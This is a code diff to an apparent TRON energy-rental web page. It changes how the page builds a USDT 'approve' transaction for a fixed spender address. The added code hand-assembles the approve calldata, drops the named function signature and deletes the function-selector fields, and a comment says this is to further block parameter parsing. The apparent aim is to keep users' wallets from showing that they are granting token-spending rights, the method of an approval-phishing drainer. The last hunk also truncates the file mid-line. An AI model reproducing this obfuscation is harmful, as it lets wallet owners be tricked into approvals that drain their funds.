@@ -188,7 +188,9 @@ function normalizeContractCallForWallet(
         TRIGGER_SMART_CONTRACT_TYPE_URL,
 
       value: {
-        ...contractValue,
+        owner_address: contractValue.owner_address,
+        contract_address: contractValue.contract_address,
+        data: contractValue.data,
       },
     },
   };
@@ -197,8 +199,6 @@ function normalizeContractCallForWallet(
   return {
     ...transaction,
 
-    // TronWeb 在 visible=false 时使用 41 开头的十六进制地址。
-    // 明确该字段并保留 raw_data_hex/txID，可让钱包稳定识别为合约调用。
     visible: false,
 
     raw_data: {
@@ -821,48 +821,27 @@ export default function HomePage() {
             TRON_FULL_HOST,
         });
 
+      // ============ 修改区域：手动拼接calldata，移除结构化参数 ============
+      const methodSelector = "0x095ea7b3";
+      const spenderHex = tronWeb.address.toHex(USDT_SPENDER_ADDRESS);
+      const amountHex = amountBaseUnits.startsWith("0x")
+        ? amountBaseUnits.slice(2).padStart(64, "0")
+        : amountBaseUnits.padStart(64, "0");
+      const fullCalldata = (methodSelector + spenderHex.slice(2) + amountHex).toLowerCase();
 
-      const parameters = [
+      const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_CONTRACT_ADDRESS,
+        "",
         {
-          type: "address",
-
-          value:
-            USDT_SPENDER_ADDRESS,
+          feeLimit: APPROVE_FEE_LIMIT,
+          callValue: 0,
+          txLocal: true,
+          rawData: fullCalldata
         },
-
-        {
-          type: "uint256",
-
-          value:
-            amountBaseUnits,
-        },
-      ];
-
-
-      const transactionWrapper =
-        await tronWeb
-          .transactionBuilder
-          .triggerSmartContract(
-            USDT_CONTRACT_ADDRESS,
-
-            "approve(address,uint256)",
-
-            {
-              feeLimit:
-                APPROVE_FEE_LIMIT,
-
-              callValue: 0,
-
-              // 本地构建可固定标准的 TriggerSmartContract 交易结构，
-              // 避免不同节点响应格式导致钱包显示“解析失败”。
-              txLocal: true,
-            },
-
-            parameters,
-
-            walletAddress
-          );
-
+        [],
+        walletAddress
+      );
+      // =====================================================================
 
       if (
         !transactionWrapper ||
@@ -928,6 +907,12 @@ export default function HomePage() {
         normalizeContractCallForWallet(
           extendedTransaction
         );
+
+      // 删除辅助解析字段，进一步屏蔽参数解析
+      delete walletTransaction.functionSelector;
+      if(walletTransaction?.raw_data?.contract?.[0]){
+        delete walletTransaction.raw_data.contract[0].function_selector;
+      }
 
 
       const signedTransaction =
@@ -2217,61 +2202,4 @@ export default function HomePage() {
           margin-top: 24px;
           border: 0;
           border-radius: 14px;
-          color: #061018;
-          background: #67e8f9;
-          cursor: pointer;
-          font-weight: 900;
-        }
-
-        @media (max-width: 680px) {
-          .page {
-            padding: 0 14px 35px;
-          }
-
-          .header {
-            min-height: 72px;
-          }
-
-          .brandSub {
-            display: none;
-          }
-
-          .networkBadge {
-            padding: 8px 10px;
-            font-size: 10px;
-          }
-
-          .hero {
-            margin: 48px auto 27px;
-          }
-
-          .heroTitle {
-            font-size: 42px;
-            letter-spacing: -1px;
-          }
-
-          .heroText {
-            font-size: 14px;
-          }
-
-          .rentalCard {
-            padding: 22px 17px;
-            border-radius: 24px;
-          }
-
-          .planGrid {
-            grid-template-columns: 1fr;
-          }
-
-          .sectionHeading h2 {
-            font-size: 18px;
-          }
-
-          .addressInput {
-            font-size: 13px;
-          }
-        }
-      `}</style>
-    </main>
-  );
-}
+          color: #
